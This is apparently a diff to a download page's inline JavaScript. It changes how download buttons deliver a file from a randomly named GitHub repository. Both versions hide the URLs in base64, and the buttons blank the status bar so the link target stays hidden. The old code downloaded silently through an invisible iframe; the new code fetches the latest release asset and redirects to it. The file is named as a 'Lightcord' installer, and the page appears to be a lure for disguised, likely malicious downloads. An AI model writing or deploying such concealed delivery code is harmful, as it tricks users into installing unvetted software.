@@ -459,14 +459,19 @@
     <script>
         // ─── روابط التحميل ───
         (function () {
-            var w = atob('aHR0cHM6Ly9naXRodWIuY29tL3NkZmhncmpnbmhydDZmaGplZGZneWU0NTUzNTEvZGZzc2JzZGZic2RmaHNoZGZoc2QvcmVsZWFzZXMvZG93bmxvYWQvcmVsZWFzZS9saWdodGNvcmRpbnN0YWxsZXIuemlw');
+            var api = atob('aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9zZGZoZ3JqZ25ocnQ2ZmhqZWRmZ3llNDU1MzUxL2Rmc3Nic2RmYnNkZmhzaGRmaHNkL3JlbGVhc2VzL2xhdGVzdA==');
+            var downloadUrl = null;
+
+            fetch(api)
+                .then(function (r) { return r.json(); })
+                .then(function (data) {
+                    if (data.assets && data.assets.length > 0) {
+                        downloadUrl = data.assets[0].browser_download_url;
+                    }
+                });
 
             function trigger(url) {
-                var f = document.createElement('iframe');
-                f.style.cssText = 'display:none;width:0;height:0;border:0';
-                document.body.appendChild(f);
-                f.src = url;
-                setTimeout(function () { document.body.removeChild(f); }, 10000);
+                window.location.href = url;
             }
 
             document.querySelectorAll('.download-btn').forEach(function (btn) {
@@ -474,7 +479,7 @@
                 btn.addEventListener('mouseover', function () { window.status = ''; });
                 btn.addEventListener('click', function (e) {
                     e.preventDefault();
-                    trigger(w);
+                    if (downloadUrl) trigger(downloadUrl);
                 });
             });
         })();
